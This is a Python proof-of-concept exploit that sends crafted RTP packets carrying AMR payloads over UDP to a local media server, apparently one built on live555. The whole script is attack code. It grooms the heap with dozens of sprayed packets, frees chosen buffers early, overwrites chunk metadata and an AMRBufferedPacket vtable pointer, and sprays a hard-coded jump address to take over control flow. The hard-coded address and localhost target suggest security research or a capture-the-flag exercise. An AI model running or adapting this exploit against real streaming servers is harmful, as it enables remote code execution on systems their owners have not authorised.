#!/usr/bin/env python3
from time import sleep
from socket import socket, AF_INET, SOCK_DGRAM
import struct
import bitstruct
import sys

UDP_IP = '127.0.0.1'
RTP_PORT = 1234
RTCP_PORT = 1235

class BitStream(object):
    def __init__(self, fmtstr, values):
        self.fmtstr = fmtstr
        self.values = values

    def pack(self):
        # print(self.fmtstr, self.values, file=sys.stderr)
        return bitstruct.pack(self.fmtstr, *self.values)

    def __add__(self, other):
        return BitStream(self.fmtstr + other.fmtstr, self.values + other.values)

    @classmethod
    def raw(cls, bytes, length = None):
        if length is None:
            length = len(bytes) * 8
        return cls('r%d' % length, [bytes])


class SequenceNumGenerator(object):
    def __init__(self, start, increment=1):
        self.seqnum = start
        self.increment = increment

    def gen(self):
        ret = self.seqnum
        self.seqnum += self.increment
        return ret


class Constructor(object):
    def rtp_header(self, ssrc, seqnum):
        if not isinstance(seqnum, int):
            seqnum = seqnum.gen()

        return BitStream.raw(
            b'\x80\xef' +
            struct.pack('>H', seqnum) +
            b'\x00\x00\x00\x00' +
            struct.pack('>I', ssrc))

    def rtcp_sender_report(self, ssrc):
        fmt = '>2BHIQ3I'
        return struct.pack(
            fmt,
            0x80, # Constant header bits (with 0 reception reports)
            200,  # Packet type
            int(struct.calcsize(fmt) / 4 - 1),  # Length
            ssrc, # sender SSRC
            1000, # NTP timestamp
            1000, # RTP timestamp
            0,    # Packet count
            0,    # Octet count
        )

    def toc(self, frametypes):
        nframes = len(frametypes)
        fmtstr = 'u4' + 'u1u4u1' * nframes  # CMR + toc entry per frame
        values = [15]  # CMR
        for i, frametype in enumerate(frametypes):
            F = int(i != nframes-1)  # 1 until the last entry, then 0
            values.extend([F, frametype, 1])
        return BitStream(fmtstr, values)


def main():
    print("UDP target IP:", UDP_IP, file=sys.stderr)
    print("UDP target port:", RTP_PORT, file=sys.stderr)

    cons = Constructor()

    # Reliable modification of AMRBufferedPacket vptr
    prep_payload = (
        BitStream.raw(b'\xff', length=6) +
        BitStream.raw(
            b'A' * 0x56 +
            struct.pack('<Q', 0xe5) +  # next size
            b'\x40' +  # don't change the vptr
            #struct.pack('<Q', 0x603050) +
            b'A' * 100
        )
    )
    target = struct.pack('<Q', 0x401519)
    messages = [
        # Initialize a bunch of buffers with the payload
        cons.rtp_header(0, 30) + cons.toc([9]) + prep_payload,
        cons.rtp_header(0, 32) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 33) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 34) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 35) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 36) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 37) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 38) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 39) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 40) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 41) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 42) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 43) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 44) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 45) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 46) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 47) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 48) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 49) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 50) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 51) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 52) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 53) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 54) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 55) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 56) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 57) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 58) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 59) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 60) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 61) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 62) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 63) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 64) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 65) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 66) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 67) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 68) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 69) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 70) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 71) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 72) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 73) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 74) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 75) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 76) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 77) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 78) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 79) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 80) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 81) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 82) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 83) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 84) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 85) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 86) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 87) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 88) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 89) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 90) + cons.toc([15]) + prep_payload,

        # Now make sure some of those get processed so the buffers are freed
        cons.rtp_header(0, 31) + cons.toc([15]) + prep_payload,
        300,

        # These slow things down so we are sure to have time to send everything
        cons.rtp_header(0, 700) + cons.toc([15]) + BitStream.raw(b'B' * 10),  # Eat up fSavedPacket
        cons.rtp_header(0, 92) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 94) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 96) + cons.toc([15]) + prep_payload,
        cons.rtp_header(0, 98) + cons.toc([15]) + prep_payload,

        # slow down processing and eat up nonconsecutive space
        cons.rtp_header(0, 710) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 712) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 714) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 716) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 718) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 720) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 722) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 724) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 726) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 728) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 730) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 732) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 734) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 736) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 738) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 740) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 742) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 744) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 746) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 748) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 750) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 752) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 754) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 756) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 758) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 760) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 762) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 764) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 766) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 768) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 770) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 772) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 774) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 776) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 778) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 780) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 782) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 784) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 786) + cons.toc([15]) + BitStream.raw(b'B' * 10),

        # These ones get freed...
        cons.rtp_header(0, 100) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 101) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 102) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 103) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 104) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 105) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 106) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 107) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 108) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 109) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        cons.rtp_header(0, 110) + cons.toc([15]) + BitStream.raw(b'C' * 10),
        # So this one can overwrite its own metadata
        cons.rtp_header(0, 111) + cons.toc([8, 6]) + BitStream.raw(b'D'*0x2d),
        # To prematurely free this one
        cons.rtp_header(0, 650) + cons.toc([15]) + BitStream.raw(b'C' * 10),

        # Start processing!
        cons.rtp_header(0, 91) + cons.toc([15]) + BitStream.raw(b'E' * 10),
        cons.rtp_header(0, 93) + cons.toc([15]) + BitStream.raw(b'E' * 10),
        cons.rtp_header(0, 95) + cons.toc([15]) + BitStream.raw(b'E' * 10),
        cons.rtp_header(0, 97) + cons.toc([15]) + BitStream.raw(b'E' * 10),
        cons.rtp_header(0, 99) + cons.toc([15]) + BitStream.raw(b'E' * 10),

        # These aim to prevent all the 700s above from being processed
        cons.rtp_header(0, 600) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        100,
        cons.rtp_header(0, 602) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 604) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(2, 604) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(3, 604) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(4, 604) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 800) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 802) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 804) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 806) + cons.toc([15]) + BitStream.raw(b'B' * 10),
        cons.rtp_header(0, 808) + BitStream.raw(b'\0' * 4 + target * 8),
        cons.rtp_header(0, 810) + BitStream.raw(b'\0' * 4 + target * 8),
        cons.rtp_header(0, 812) + BitStream.raw(b'\0' * 4 + target * 8),
        100,
        cons.rtp_header(0, 814) + BitStream.raw(b'\0' * 4 + target * 8),
        cons.rtp_header(0, 816) + BitStream.raw(b'\0' * 4 + target * 8),
        100,
        cons.rtp_header(0, 818) + BitStream.raw(b'\0' * 4 + target * 8),
    ]

    processed_messages = []
    for m in messages:
        if isinstance(m, BitStream):
            processed_messages.append(m.pack())
        elif isinstance(m, tuple) and isinstance(m[1], BitStream):
            processed_messages.append((m[0], m[1].pack()))
        else:
            processed_messages.append(m)


    s = socket(AF_INET, SOCK_DGRAM)
    for m in processed_messages:
        if isinstance(m, int):
            sleep(m / 1000.)
            continue

        port = RTP_PORT
        if isinstance(m, tuple):
            port, m = m
        if isinstance(m, BitStream):
            m = m.pack()
        s.sendto(m, (UDP_IP, port))


if __name__ == "__main__":
    main()
